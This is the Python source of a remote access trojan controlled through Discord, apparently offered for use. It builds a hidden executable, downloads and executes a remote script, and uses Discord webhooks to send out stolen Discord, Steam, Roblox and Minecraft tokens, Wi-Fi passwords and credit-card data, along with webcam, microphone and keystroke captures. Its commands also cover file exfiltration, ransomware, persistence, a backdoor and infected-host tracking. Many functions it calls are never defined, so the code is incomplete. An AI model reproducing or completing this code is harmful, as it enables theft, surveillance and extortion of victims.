import discord
import asyncio
import requests
import json
import os
import threading
from discord.ext import commands
from pynput.keyboard import Listener, Key, KeyCode
import wave
import pyaudio
import cv2
from PIL import ImageGrab
import time
from Crypto.Cipher import AES
import base64
import logging
import shutil
import ctypes
import uuid
import socket
import subprocess
import winreg
import win32clipboard
import win32crypt
import psutil
import platform
import random
import string
import PyInstaller.__main__
from pathlib import Path
import atexit
import aiohttp

# Setup Logging
BASE_DIR = Path(__file__).resolve().parent
LOG_PATH = Path.home() / "RAT-Control" / "bot.log"

def setup_logger(log_file_path):
    log_file_path.parent.mkdir(parents=True, exist_ok=True)
    logger = logging.getLogger('RATLogger')
    logger.setLevel(logging.DEBUG)

    file_handler = logging.FileHandler(log_file_path, encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.ERROR)

    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)

    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    return logger

logger = setup_logger(LOG_PATH)
logger.info("Logging initialized")

# Admin Check
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        logger.error(f"Failed to check admin privileges: {e}")
        return False

if not is_admin():
    logger.warning("Not running with administrator privileges.")

# Dependency Installation
def install_missing_packages():
    required = [
        'pyaudio', 'pillow', 'selenium', 'pywin32', 'pycryptodome',
        'aiohttp', 'pyinstaller', 'pynput', 'opencv-python', 'discord.py'
    ]
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = [pkg for pkg in required if pkg not in installed]
    if missing:
        logger.info(f"Installing: {missing}")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "--verbose", pkg])
                time.sleep(60)
            except subprocess.CalledProcessError as e:
                logger.error(f"Failed to install package {pkg}: {e}")
                logger.error(f"Error output: {e.output}")
    else:
        logger.info("All packages installed")

install_missing_packages()
logger.info("Dependency installation complete. Continuing with the script.")

# Generate Spec File for Silent Build
def generate_spec_file(script_name, spec_path):
    spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-
block_cipher = None

a = Analysis(
    ['{script_name}'],
    pathex=['{os.getcwd()}'],
    binaries=[],
    datas=[],
    hiddenimports=[
        'win32clipboard',
        'win32crypt',
        'Crypto.Cipher.AES',
        'Crypto.Protocol.KDF.PBKDF2'
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='rat_pc',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
)
coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name='rat_pc',
)
"""
    try:
        with open(spec_path, 'w', encoding='utf-8') as f:
            f.write(spec_content)
    except Exception as e:
        logger.error(f"Failed to write spec file: {e}")

# Build Executable
def build_executable(spec_path):
    try:
        PyInstaller.__main__.run([str(spec_path)])
        logger.info("Executable built")
    except Exception as e:
        logger.error(f"Build failed: {e}")

spec_path = BASE_DIR / "rat_pc.spec"
generate_spec_file("rat_pc.py", spec_path)
build_executable(spec_path)

# RAT Setup Constants
with open('tokens.json', 'r') as f:
    config = json.load(f)

DISCORD_TOKENS = config['discord_tokens']
WEBHOOK_URLS = config['webhook_urls']
UNIQUE_ID = str(uuid.uuid4())

logger.info(f"InstanceID: {UNIQUE_ID}")

# Register Clean Exit Logging
def log_shutdown():
    try:
        logger.info("RAT shutting down cleanly.")
    except Exception as e:
        logger.error(f"Failed to log shutdown: {e}")

atexit.register(log_shutdown)

# Function to download and execute the bot control script
def download_and_execute_bot_control_script():
    try:
        response = requests.get(BOT_CONTROL_URL, stream=True)
        response.raise_for_status()
        with open("bot_control_script.py", "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        logger.info("Bot control script downloaded successfully.")
        exec(open("bot_control_script.py").read())
    except Exception as e:
        logger.error(f"Failed to download or execute bot control script: {e}")

def send_webhook(message, webhook_url=None):
    if not webhook_url:
        webhook_url = random.choice(WEBHOOK_URLS)
    try:
        payload = {"content": message}
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            logger.info("Data sent to Discord successfully")
        else:
            logger.error(f"Failed to send data to Discord: {response.status_code}")
            send_webhook(message, webhook_url=next_webhook(webhook_url))
    except Exception as e:
        logger.error(f"Webhook failed: {e}")
        send_webhook(message, webhook_url=next_webhook(webhook_url))

def next_webhook(current_webhook):
    index = WEBHOOK_URLS.index(current_webhook)
    return WEBHOOK_URLS[(index + 1) % len(WEBHOOK_URLS)]

async def handle_command(cmd):
    global TOKEN
    try:
        if cmd == "list_accounts":
            try:
                tokens = find_discord_tokens() + find_minecraft_tokens() + find_steam_tokens() + find_roblox_tokens()
                if tokens:
                    send_webhook(f"accounts\nFound {len(tokens)} tokens:\n" + "\n".join(tokens))
                else:
                    send_webhook("accounts\nNo tokens found.")
            except Exception as e:
                logger.error(f"Failed to list accounts: {e}")

        elif cmd == "dump_wifi":
            try:
                wifi_credentials = dump_wifi_credentials()
                if wifi_credentials:
                    send_webhook(f"wifi_credentials\nFound {len(wifi_credentials)} Wi-Fi credentials:\n" + "\n".join([f"{ssid}: {password}" for ssid, password in wifi_credentials]))
                else:
                    send_webhook("wifi_credentials\nNo Wi-Fi credentials found.")
            except Exception as e:
                logger.error(f"Failed to dump Wi-Fi credentials: {e}")

        elif cmd == "start_webcam":
            try:
                screenshot_path = await take_screenshot()
                if screenshot_path and cv2:
                    await upload_file(screenshot_path)
                else:
                    send_webhook("start_webcam\nFailed to capture webcam.")
            except Exception as e:
                logger.error(f"Failed to start webcam: {e}")

        elif cmd.startswith("exfiltrate "):
            try:
                path = cmd.split(" ")[1]
                exfiltrate_files(path)
                send_webhook(f"exfiltrate {path}\nExfiltration started for {path}.")
            except Exception as e:
                logger.error(f"Failed to exfiltrate files: {e}")

        elif cmd == "start_ransomware":
            try:
                start_ransomware()
            except Exception as e:
                logger.error(f"Failed to start ransomware: {e}")

        elif cmd == "install_persistence":
            try:
                install_persistence()
                send_webhook("install_persistence\nPersistence installed.")
            except Exception as e:
                logger.error(f"Failed to install persistence: {e}")

        elif cmd == "self_destruct":
            try:
                self_destruct()
            except Exception as e:
                logger.error(f"Failed to self-destruct: {e}")

        elif cmd.startswith("open_backdoor "):
            try:
                ip, port = cmd.split(" ")[1].split(":")
                backdoor_thread = threading.Thread(target=open_backdoor, args=(ip, int(port)))
                backdoor_thread.start()
                send_webhook(f"open_backdoor\nBackdoor opened on {ip}:{port}.")
            except Exception as e:
                logger.error(f"Failed to open backdoor: {e}")

        elif cmd == "get_ip":
            try:
                ip_info = get_ip_and_geolocation()
                send_webhook(f"get_ip\nIP Info: {json.dumps(ip_info, indent=2)}")
            except Exception as e:
                logger.error(f"Failed to get IP info: {e}")

        elif cmd == "record_audio":
            try:
                audio_path = await record_audio()
                if audio_path:
                    await upload_file(audio_path)
                else:
                    send_webhook("record_audio\nFailed to record audio.")
            except Exception as e:
                logger.error(f"Failed to record audio: {e}")

        elif cmd == "steamdump":
            try:
                steam_data = find_steam_phished_data()
                if steam_data:
                    send_webhook(f"steamdump\nFound Steam data:\n{steam_data}")
                else:
                    send_webhook("steamdump\nNo Steam data found.")
            except Exception as e:
                logger.error(f"Failed to dump Steam data: {e}")

        elif cmd == "minecraftdump":
            try:
                minecraft_data = find_minecraft_phished_data()
                if minecraft_data:
                    send_webhook(f"minecraftdump\nFound Minecraft data:\n{minecraft_data}")
                else:
                    send_webhook("minecraftdump\nNo Minecraft data found.")
            except Exception as e:
                logger.error(f"Failed to dump Minecraft data: {e}")

        elif cmd == "robloxdump":
            try:
                roblox_data = find_roblox_phished_data()
                if roblox_data:
                    send_webhook(f"robloxdump\nFound Roblox data:\n{roblox_data}")
                else:
                    send_webhook("robloxdump\nNo Roblox data found.")
            except Exception as e:
                logger.error(f"Failed to dump Roblox data: {e}")

        elif cmd == "discorddump":
            try:
                discord_data = find_discord_phished_data()
                if discord_data:
                    send_webhook(f"discorddump\nFound Discord data:\n{discord_data}")
                else:
                    send_webhook("discorddump\nNo Discord data found.")
            except Exception as e:
                logger.error(f"Failed to dump Discord data: {e}")

        elif cmd == "ccdump":
            try:
                cc_data = find_cc_phished_data()
                if cc_data:
                    send_webhook(f"ccdump\nFound CC data:\n{cc_data}")
                else:
                    send_webhook("ccdump\nNo CC data found.")
            except Exception as e:
                logger.error(f"Failed to dump CC data: {e}")

        elif cmd.startswith("swap_host "):
            try:
                new_host = cmd.split(" ")[1]
                if new_host in infected_hosts:
                    current_host = new_host
                    send_webhook(f"swap_host\nSwitched to host: {new_host}")
                else:
                    send_webhook(f"swap_host\nHost {new_host} not found.")
            except Exception as e:
                logger.error(f"Failed to swap host: {e}")

        elif cmd.startswith("rename_host "):
            try:
                old_name, new_name = cmd.split(" ")[1], cmd.split(" ")[2]
                if old_name in infected_hosts:
                    infected_hosts[new_name] = infected_hosts.pop(old_name)
                    send_webhook(f"rename_host\nHost renamed from {old_name} to {new_name}")
                else:
                    send_webhook(f"rename_host\nHost {old_name} not found.")
            except Exception as e:
                logger.error(f"Failed to rename host: {e}")

        elif cmd == "list_hosts":
            try:
                if infected_hosts:
                    host_list = "\n".join(infected_hosts.keys())
                    send_webhook(f"list_hosts\nCurrently infected hosts:\n{host_list}")
                else:
                    send_webhook("list_hosts\nNo infected hosts found.")
            except Exception as e:
                logger.error(f"Failed to list hosts: {e}")

        elif cmd == "status":
            try:
                send_webhook(f"status\nCurrently in host: {current_host}")
            except Exception as e:
                logger.error(f"Failed to get status: {e}")

        elif cmd == "help":
            help_message = """
            Available commands:
            - `!list_accounts`: Lists all phished accounts (Discord, Minecraft, Steam, Roblox).
            - `!dump_wifi`: Dumps Wi-Fi credentials.
            - `!start_webcam`: Takes a screenshot using the webcam.
            - `!exfiltrate <path>`: Exfiltrates files from the specified path.
            - `!start_ransomware`: Starts the ransomware module.
            - `!install_persistence`: Installs persistence on the system.
            - `!self_destruct`: Initiates self-destruct sequence.
            - `!open_backdoor <ip>:<port>`: Opens a backdoor on the specified IP and port.
            - `!get_ip`: Gets the public IP and geolocation information.
            - `!record_audio`: Records audio from the microphone.
            - `!steamdump`: Dumps phished Steam data.
            - `!minecraftdump`: Dumps phished Minecraft data.
            - `!robloxdump`: Dumps phished Roblox data.
            - `!discorddump`: Dumps phished Discord data.
            - `!ccdump`: Dumps phished credit card data.
            - `!swap_host <host>`: Swaps to the specified host.
            - `!rename_host <old_name> <new_name>`: Renames the specified host.
            - `!list_hosts`: Lists all currently infected hosts.
            - `!status`: Shows the current host status.
            - `!help`: Displays this help message.
            """
            send_webhook(f"help\n{help_message}")

        else:
            send_webhook(f"unknown_command\nUnknown command: {cmd}")

    except discord.errors.HTTPException as e:
        if e.status == 401:
            logger.warning("Token revoked, switching to next token.")
            TOKEN = next_token(TOKEN)
            await bot.start(TOKEN)
        else:
            raise

def next_token(current_token):
    index = DISCORD_TOKENS.index(current_token)
    return DISCORD_TOKENS[(index + 1) % len(DISCORD_TOKENS)]

def rotate_tokens():
    global TOKEN
    global WEBHOOK_URL
    TOKEN = random.choice(DISCORD_TOKENS)
    WEBHOOK_URL = random.choice(WEBHOOK_URLS)
    logger.info(f"Rotated to new token: {TOKEN}")
    logger.info(f"Rotated to new webhook: {WEBHOOK_URL}")
    threading.Timer(3600, rotate_tokens).start()  # Rotate every hour

rotate_tokens()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith("!keylogger start"):
        logging.info("Starting keylogger...")
        threading.Thread(target=start_keylogger).start()

    elif message.content.startswith("!record_audio"):
        try:
            duration = int(message.content.split(" ")[1])
            logging.info(f"Recording audio for {duration} seconds...")
            record_audio(duration)
        except Exception as e:
            logging.error(f"Audio command error: {e}")
            send_webhook("Usage: !record_audio <duration>")

    elif message.content.startswith("!screenshot"):
        capture_screenshot()

    elif message.content.startswith("!start_webcam"):
        capture_webcam()

    elif message.content == "!steamdump":
        steam_dump()

    elif message.content == "!discorddump":
        discord_dump()

    elif message.content == "!robloxdump":
        roblox_dump()

    elif message.content == "!minecraftdump":
        minecraft_dump()

    elif message.content == "!exfil_all":
        exfiltrate_files()

    elif message.content == "!help":
        send_webhook("Help command list not implemented.")

    else:
        send_webhook(f"Unknown command: {message.content}")

async def setup():
    apply_rootkit_technique()
    global TOKEN
    TOKEN = random.choice(DISCORD_TOKENS)
    await bot.start(TOKEN)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.create_task(setup())
    loop.run_forever()
